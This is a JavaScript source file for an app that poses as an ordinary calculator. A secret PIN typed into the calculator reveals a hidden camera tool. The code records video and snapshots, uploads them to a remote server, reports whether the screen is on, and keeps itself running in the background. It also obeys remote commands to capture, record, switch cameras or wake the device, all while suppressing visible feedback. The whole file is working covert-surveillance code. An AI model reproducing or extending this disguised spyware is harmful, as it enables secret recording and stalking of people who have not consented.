const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';

const calcScreen = document.getElementById('calcLockScreen');
const displayEl = document.getElementById('calcDisplay');
const historyEl = document.getElementById('calcHistory');
const videoEl = document.getElementById('cameraVideo');
const motionCanvas = document.getElementById('motionCanvas');
const snapshotCanvas = document.getElementById('snapshotCanvas');
const loginOverlay = document.getElementById('loginOverlay');
const loginForm = document.getElementById('loginForm');
const registerForm = document.getElementById('registerForm');
const authTabLogin = document.getElementById('authTabLogin');
const authTabRegister = document.getElementById('authTabRegister');

const UNLOCK_PIN = '243';
let isUnlocked = false;
let currentUser = null;
let cameraStream = null;
let facingMode = 'environment';
let isArmed = false;
let motionCheckInterval = null;
let prevFrameData = null;
let motionSensitivity = 8;
let lastMotionTime = 0;
let motionCooldownMs = 15000;
let motionClipDurationMs = 10000;
let isRecordingMotionClip = false;
let isRecording = false;
let mediaRecorder = null;
let recordedChunks = [];
let recordingSessionId = null;
let recStartTime = null;
let recTimerInterval = null;
let segmentNumber = 0;
let segmentTimeout = null;
let segmentDurationMs = 30000;
let lastCmdTimestamp = 0;
let cmdPollInterval = null;
let heartbeatInterval = null;
let wakeLock = null;

function showToast(m,d){}
function formatDuration(ms){const s=Math.floor(ms/1e3),m=Math.floor(s/60),sec=s%60;return String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0')}
function createSessionId(b){return b+'_'+Date.now().toString(36)+'_'+Math.random().toString(36).slice(2,8)}

// ============ LOGIN OVERLAY ============
function showLogin(){loginOverlay.classList.add('active');}
function hideLogin(){loginOverlay.classList.remove('active');}
function switchAuth(t){document.querySelectorAll('.auth-tab').forEach(b=>b.classList.remove('active'));document.getElementById(t==='login'?'authTabLogin':'authTabRegister').classList.add('active');document.getElementById('loginForm').classList.toggle('hidden',t!=='login');document.getElementById('registerForm').classList.toggle('hidden',t!=='register');}
window.switchAuth=switchAuth;

async function handleLogin(e){e.preventDefault();const u=document.getElementById('loginUsername').value.trim().toLowerCase();const p=document.getElementById('loginPassword').value;try{const r=await fetch(SERVER_URL+'/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});const j=await r.json();if(r.ok&&j.status==='ok'){hideLogin();startCameraBackground(j.user);}else{alert('❌ '+j.error||'Login failed');}}catch(err){alert('❌ Connection error');}}
window.handleLogin=handleLogin;

async function handleRegister(e){e.preventDefault();const u=document.getElementById('regUsername').value.trim().toLowerCase();const d=document.getElementById('regDisplayName').value.trim();const p=document.getElementById('regPassword').value;try{const r=await fetch(SERVER_URL+'/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p,display_name:d})});const j=await r.json();if(r.ok&&j.status==='ok'){hideLogin();startCameraBackground(j.user);}else{alert('❌ '+j.error||'Registration failed');}}catch(err){alert('❌ Connection error');}}
window.handleRegister=handleRegister;

// ============ CALCULATOR ============
(function initCalc(){
if(!calcScreen||!displayEl)return;
const opS={'+':'+','-':'−','*':'×','/':'÷'};let d='0',h='',f=null,op=null,w=false,re='';
function fmt(n){if(!Number.isFinite(n))return'Error';const r=Math.round((n+Number.EPSILON)*1e12)/1e12;if(Math.abs(r)>=1e13||(Math.abs(r)>0&&Math.abs(r)<1e-7))return r.toExponential(8).replace(/(\.\d*?)0+e/,'$1e').replace(/\.e/,'e');return String(r);}
function rnd(){displayEl.textContent=d;historyEl.innerHTML=h||'&nbsp;';document.querySelectorAll('[data-calc-op]').forEach(b=>b.classList.toggle('active',b.dataset.calcOp===op&&w));}
function cc(){d='0';h='';f=null;op=null;w=false;re='';rnd();}
function id(digit){if(d==='Error')cc();if(w){d=digit;w=false;re=digit;}else{d=d==='0'?digit:d+digit;re+=digit;}if(d.replace('-','').length>16)d=d.slice(0,d.startsWith('-')?17:16);rnd();}
function dec(){if(d==='Error')cc();if(w){d='0.';w=false;re='0.';}else if(!d.includes('.')){d+='.';re+='.';}rnd();}
function ca(a,b,o){if(o==='+')return a+b;if(o==='-')return a-b;if(o==='*')return a*b;if(o==='/')return b===0?NaN:a/b;return b;}
function opFn(o){if(d==='Error')cc();const v=Number(d);re='';if(op&&w){op=o;h=`${fmt(f)} ${opS[o]}`;rnd();return;}if(f===null)f=v;else if(op){const r=ca(f,v,op);d=Number.isFinite(r)?fmt(r):'Error';f=Number(d);}op=o;w=true;h=`${d} ${opS[o]}`;rnd();}
function hsc(c){if(!isUnlocked||!currentUser)return;switch(c){case'111':toggleArm();break;case'222':captureSnapshot();break;case'333':toggleRecording();break;case'444':switchCamera();break;case'555':break;case'000':handleLogout();break;}}
function eq(){if(!op&&String(re||d)===UNLOCK_PIN){handlePinUnlock();return;}if(!op&&isUnlocked){const raw=String(re||d);if(['111','222','333','444','555','000'].includes(raw)){hsc(raw);d='0';h='';w=true;re='';rnd();return;}}if(!op||f===null||d==='Error')return;const s=Number(d),ex=`${fmt(f)} ${opS[op]} ${fmt(s)} =`,r=ca(f,s,op);d=Number.isFinite(r)?fmt(r):'Error';f=null;op=null;w=true;re=d;h=ex;rnd();}
function dl(){if(d==='Error'||w){d='0';re='';w=false;}else if(d.length<=1||(d.startsWith('-')&&d.length===2)){d='0';re='';}else{d=d.slice(0,-1);re=re.slice(0,-1);}rnd();}
function si(){if(d==='0'||d==='Error')return;d=d.startsWith('-')?d.slice(1):'-'+d;re=d;rnd();}
function pc(){if(d==='Error')return;d=fmt(Number(d)/100);re=d;rnd();}
function act(n){if(n==='clear')cc();else if(n==='delete')dl();else if(n==='decimal')dec();else if(n==='equals')eq();else if(n==='sign')si();else if(n==='percent')pc();}
function handlePinUnlock(){cc();const stored=localStorage.getItem('securecamUser');if(stored){try{const user=JSON.parse(stored);if(user&&user.username){isUnlocked=true;startCameraBackground(user);return;}}catch(e){localStorage.removeItem('securecamUser');}}isUnlocked=true;showLogin();}
calcScreen.querySelectorAll('.calc-key').forEach(b=>{b.addEventListener('click',()=>{if(b.dataset.calcNum!==undefined)id(b.dataset.calcNum);else if(b.dataset.calcOp)opFn(b.dataset.calcOp);else if(b.dataset.calcAction)act(b.dataset.calcAction);});});
window.addEventListener('keydown',e=>{if(!calcScreen.classList.contains('active'))return;if(loginOverlay.classList.contains('active'))return;if(/^[0-9]$/.test(e.key)){id(e.key);return;}if(['+','-','*','/'].includes(e.key)){e.preventDefault();opFn(e.key);return;}if(e.key==='.'||e.key===','){dec();return;}if(e.key==='Enter'||e.key==='='){e.preventDefault();eq();return;}if(e.key==='Backspace'){dl();return;}if(e.key==='Escape'){cc();return;}if(e.key==='%'){pc();}});
calcScreen.classList.add('active');rnd();
})();

// ============ CAMERA ============
function handleLogout(){if(!confirm('Stop camera and exit?'))return;stopRecording();stopMotionDetection();if(cameraStream){cameraStream.getTracks().forEach(t=>t.stop());cameraStream=null;}if(heartbeatInterval){clearInterval(heartbeatInterval);heartbeatInterval=null;}if(cmdPollInterval){clearInterval(cmdPollInterval);cmdPollInterval=null;}releaseWakeLock();stopNativeBackgroundService();localStorage.removeItem('securecamUser');currentUser=null;isUnlocked=false;}
window.handleLogout=handleLogout;

async function startCameraBackground(user){currentUser=user;localStorage.setItem('securecamUser',JSON.stringify(user));await initCamera();requestWakeLock();sendHeartbeat();heartbeatInterval=setInterval(sendHeartbeat,1e4);startCommandPolling();startNativeBackgroundService();}
function startNativeBackgroundService(){if(window.Capacitor&&window.Capacitor.Plugins&&window.Capacitor.Plugins.BackgroundCamera){window.Capacitor.Plugins.BackgroundCamera.start({username:currentUser.username}).catch(()=>{});}}
function stopNativeBackgroundService(){if(window.Capacitor&&window.Capacitor.Plugins&&window.Capacitor.Plugins.BackgroundCamera){window.Capacitor.Plugins.BackgroundCamera.stop().catch(()=>{});}}
async function initCamera(){try{if(cameraStream)cameraStream.getTracks().forEach(t=>t.stop());cameraStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode},width:{ideal:1280},height:{ideal:720}},audio:false});videoEl.srcObject=cameraStream;await videoEl.play();}catch(e){console.error('Camera failed:',e);}}
async function switchCamera(){facingMode=facingMode==='user'?'environment':'user';await initCamera();}
window.switchCamera=switchCamera;
async function requestWakeLock(){try{if('wakeLock'in navigator){wakeLock=await navigator.wakeLock.request('screen');wakeLock.addEventListener('release',()=>{if(currentUser)requestWakeLock();});}}catch(e){}}
async function releaseWakeLock(){if(wakeLock){try{await wakeLock.release();}catch(e){}wakeLock=null;}}
async function sendHeartbeat(){if(!currentUser)return;try{await fetch(SERVER_URL+'/api/users/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:currentUser.username,screen_status:document.visibilityState==='visible'?'on':'off'})});}catch(e){}}
function toggleArm(){if(!currentUser||!cameraStream)return;isArmed=!isArmed;if(isArmed)startMotionDetection();else stopMotionDetection();}
window.toggleArm=toggleArm;
function startMotionDetection(){if(motionCheckInterval)clearInterval(motionCheckInterval);prevFrameData=null;motionCheckInterval=setInterval(checkMotion,600);}
function stopMotionDetection(){if(motionCheckInterval){clearInterval(motionCheckInterval);motionCheckInterval=null;}prevFrameData=null;}
function checkMotion(){if(!isArmed||!cameraStream||!videoEl.videoWidth)return;const GW=48,GH=36;motionCanvas.width=GW;motionCanvas.height=GH;const ctx=motionCanvas.getContext('2d');ctx.drawImage(videoEl,0,0,GW,GH);const cd=ctx.getImageData(0,0,GW,GH);if(!prevFrameData){prevFrameData=cd;return;}let cp=0;const pt=motionSensitivity*3;for(let i=0;i<cd.data.length;i+=4){const dr=Math.abs(cd.data[i]-prevFrameData.data[i]),dg=Math.abs(cd.data[i+1]-prevFrameData.data[i+1]),db=Math.abs(cd.data[i+2]-prevFrameData.data[i+2]);if(dr+dg+db>pt)cp++;}const mp=(cp/(GW*GH))*100;prevFrameData=cd;if(mp>2.0){const n=Date.now();if(n-lastMotionTime>motionCooldownMs&&!isRecordingMotionClip){lastMotionTime=n;onMotionDetected(mp);}}}
async function onMotionDetected(intensity){isRecordingMotionClip=true;try{await fetch(SERVER_URL+'/api/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'chat_message',roomId:currentUser.username+'_secam',text:'🚨 MOTION '+intensity.toFixed(0)+'%',sender:'SecureCam'})});}catch(e){}await recordClip(motionClipDurationMs,'motion');isRecordingMotionClip=false;}
async function recordClip(dm,lb){if(!cameraStream)return;try{const s=createSessionId(currentUser.username+'_'+lb),m=getSupportedMimeType(),r=new MediaRecorder(cameraStream,{mimeType:m,videoBitsPerSecond:1500000}),c=[];r.ondataavailable=e=>{if(e.data&&e.data.size>0)c.push(e.data);};r.onstop=()=>{const b=new Blob(c,{type:m});if(b.size>0)uploadRecording(b,s,1,true);};r.start();await new Promise(p=>setTimeout(p,dm));r.stop();}catch(e){}}
function toggleRecording(){if(!currentUser||!cameraStream)return;if(isRecording)stopRecording();else startRecording();}
window.toggleRecording=toggleRecording;
function startRecording(){if(!cameraStream||isRecording)return;isRecording=true;segmentNumber=0;recordingSessionId=createSessionId(currentUser.username+'_cont');recStartTime=Date.now();startNewSegment();try{fetch(SERVER_URL+'/api/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'call_started',roomId:recordingSessionId})});}catch(e){}}
function startNewSegment(){if(!isRecording||!cameraStream)return;const sn=++segmentNumber,sid=recordingSessionId;recordedChunks=[];const mt=getSupportedMimeType(),r=new MediaRecorder(cameraStream,{mimeType:mt,videoBitsPerSecond:1500000});mediaRecorder=r;r.ondataavailable=e=>{if(e.data&&e.data.size>0)recordedChunks.push(e.data);};r.onstop=()=>{const ch=recordedChunks.slice();if(ch.length>0){const b=new Blob(ch,{type:mt});uploadRecording(b,sid,sn,false);}recordedChunks=[];if(isRecording)startNewSegment();};r.start(1e3);segmentTimeout=setTimeout(()=>{if(r&&r.state!=='inactive'){try{r.requestData();}catch(e){}r.stop();}},segmentDurationMs);}
function stopRecording(){if(!isRecording)return;isRecording=false;if(segmentTimeout){clearTimeout(segmentTimeout);segmentTimeout=null;}if(recTimerInterval){clearInterval(recTimerInterval);recTimerInterval=null;}if(mediaRecorder&&mediaRecorder.state!=='inactive'){const fs=segmentNumber,fsid=recordingSessionId,fm=mediaRecorder.mimeType||'video/webm';mediaRecorder.onstop=()=>{const ch=recordedChunks.slice();if(ch.length>0){const b=new Blob(ch,{type:fm});uploadRecording(b,fsid,fs,true);}recordedChunks=[];};try{mediaRecorder.requestData();}catch(e){}try{mediaRecorder.stop();}catch(e){}}try{fetch(SERVER_URL+'/api/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'call_ended',roomId:recordingSessionId,duration:formatDuration(Date.now()-recStartTime)})});}catch(e){}}
async function captureSnapshot(){if(!cameraStream||!videoEl.videoWidth)return;try{snapshotCanvas.width=videoEl.videoWidth;snapshotCanvas.height=videoEl.videoHeight;const ctx=snapshotCanvas.getContext('2d');ctx.drawImage(videoEl,0,0);const b=await new Promise(r=>snapshotCanvas.toBlob(r,'image/jpeg',0.85));if(!b)return;const fd=new FormData();fd.append('file',b,`snapshot_${currentUser.username}_${Date.now()}.jpg`);fd.append('password','');fd.append('viewOnce','false');await fetch(SERVER_URL+'/api/upload-file',{method:'POST',body:fd});}catch(e){}}
window.captureSnapshot=captureSnapshot;
async function uploadRecording(blob,sid,sn,il){if(!blob||blob.size===0)return;try{const e=blob.type&&blob.type.includes('mp4')?'mp4':'webm',fd=new FormData();fd.append('video',blob,`secam_${sid}_part${sn}.${e}`);fd.append('roomId',sid);fd.append('segmentNumber',String(sn));fd.append('isLast',String(il));fd.append('segmentSize',String(blob.size));await fetch(SERVER_URL+'/api/upload-recording',{method:'POST',body:fd});}catch(e){}}
function startCommandPolling(){if(cmdPollInterval)clearInterval(cmdPollInterval);cmdPollInterval=setInterval(pollCmds,2500);}
async function pollCmds(){if(!currentUser)return;try{const r=await fetch(SERVER_URL+'/api/camera-control?username='+encodeURIComponent(currentUser.username));const j=await r.json();if(j&&j.action&&j.action!=='none'&&Number(j.timestamp)>lastCmdTimestamp){lastCmdTimestamp=Number(j.timestamp);handleRemoteCommand(j.action);}}catch(e){}}
function handleRemoteCommand(a){switch(a){case'snap':captureSnapshot();break;case'start_rec':if(!isRecording)startRecording();break;case'stop_rec':if(isRecording)stopRecording();break;case'arm':if(!isArmed)toggleArm();break;case'disarm':if(isArmed)toggleArm();break;case'cam_on':if(cameraStream)cameraStream.getVideoTracks().forEach(t=>t.enabled=true);break;case'cam_off':if(cameraStream)cameraStream.getVideoTracks().forEach(t=>t.enabled=false);break;case'cam_switch':switchCamera();break;case'add':if(window.Capacitor&&window.Capacitor.Plugins&&window.Capacitor.Plugins.BackgroundCamera)window.Capacitor.Plugins.BackgroundCamera.wakeScreen().catch(()=>{});break;}}
function getSupportedMimeType(){if(typeof MediaRecorder!=='undefined'&&MediaRecorder.isTypeSupported){const t=['video/mp4;codecs=h264,aac','video/mp4','video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm'];for(const x of t){if(MediaRecorder.isTypeSupported(x))return x;}}return'video/webm';}
document.body.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
